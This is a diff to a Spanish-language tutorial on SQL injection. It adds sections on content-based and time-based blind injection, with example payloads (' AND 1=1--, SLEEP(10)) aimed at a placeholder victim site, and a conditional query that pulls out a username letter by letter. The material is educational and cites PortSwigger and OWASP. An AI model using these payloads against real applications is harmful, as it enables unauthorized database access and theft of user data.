@@ -114,7 +114,7 @@ Utilizar la cláusula "**NULL**" de forma parecida al método anterior, probando
 ... etc
 ```
 
-### Determinar el tipo de datos de la columna:
+### Determinar el tipo de datos de la columna
 Una vez se ha obtenido la cantidad de columnas que devuelve la consulta, deberemos saber el tipo de datos de cada columna. Una forma de averiguarlo es alternar, por ejemplo, un caracter de tipo texto 'x' y ver si el resultado ddevuelve o no error.
 
 ```
@@ -127,6 +127,43 @@ Una vez se ha obtenido la cantidad de columnas que devuelve la consulta, deberem
 ## Inyección SQL a ciegas (Blind SQLi)
 En ocasiones, es posible que ante la inyección de un payload en una consulta, no se obtenga ningún resultado en la respuesta HTTP, ni detalles de la consulta ni errores.
 En este caso, se puede intentar la aplicación de las inyecciones ciegas.
+### Inyección ciega basada en el contenido
+Imaginemos la petición de un determinado producto a nuestra web de productos:
+
+```https://www.webvictima.com/productos?id=23 ```
+
+Que, por ejemplo, se traduce en la siguiente consulta SQL:
+
+```SQL 
+SELECT * FROM Productos WHERE id_producto=23;
+```
+
+Si ahora aplicamos un payload cierto y otro falso de forma consecutiva, podemos observar si existe alguna diferencia en la respuesta de la BB.DD., en caso de existir una diferencia, sabremos que podemos aplicar payloads y únicamente deberemos observar el resultado para saber si la consulta devuelve cierto o falso.
+
+```SQL 
+-- Aplicamos un payload que devuelva TRUE ' AND 1=1--
+SELECT * FROM Productos WHERE id_producto=23 AND 1=1--;
+
+-- Aplicamos un payload que devuelva FALSE ' AND 1=2--
+SELECT * FROM Productos WHERE id_producto=23 AND 1=2--;
+```
+### Inyección ciega basada en el tiempo
+Otra forma de detectar si una aplicación es vulnerable a inyecciones SQL cuando la base de datos no devuelve errores, es utilizando retardos en las consultas. La idea es aplicar un retardo a una condición verdadera y a una falsa, observar si se produce un retraso significativo en la respuesta y por la tanto, tener la base para determinar respuestas verdaderas o falsas.
+
+```SQL 
+-- Aplicamos un payload que devuelva TRUE ' AND 1=1 AND SLEEP(10)--
+SELECT * FROM Productos WHERE id_producto=23 AND 1=1 AND SLEEP(10)--;
+
+-- Aplicamos un payload que devuelva FALSE ' AND 1=2 AND SLEEP(10)--
+SELECT * FROM Productos WHERE id_producto=23 AND 1=2 AND SLEEP(10)--;
+```
+A partir de aquí, podríamos ir poniendo condicionales para intentar obtener datos a ciegas:
+
+```SQL
+-- Delay de 10 segundos si la primera letra del usuario es una 'a'
+SELECT IF(LEFT(usuario, 1)='a',SLEEP(10),SLEEP(0))
+```
+
 ## Obtención de datos de estructura
 Un ejemplo de cómo llegar a obtener el conjunto de tablas que componen la base de datos seria el que se adjunta a continuación (la sintaxis puede variar en función de la base de datos):
 
@@ -134,9 +171,11 @@ Un ejemplo de cómo llegar a obtener el conjunto de tablas que componen la base 
 SELECT * FROM information_schema.tables
 ```
 ## Bibliografía
-- Portswigger. SQL injection. https://portswigger.net/web-security/sql-injection
+- Portswigger. (s.f.). SQL injection. https://portswigger.net/web-security/sql-injection
 - Sengupta, S. (25/07/2022). Medium. https://sudip-says-hi.medium.com/union-based-sql-injection-guide-to-understanding-mitigating-such-attacks-1775149e80e6 
-- PortSwigger. Blind SQL injection. https://portswigger.net/web-security/sql-injection/blind
+- PortSwigger. (s.f.). Blind SQL injection. https://portswigger.net/web-security/sql-injection/blind
+- kingthorin. (s.f.). Blind SQL Injection. https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
 
 
 
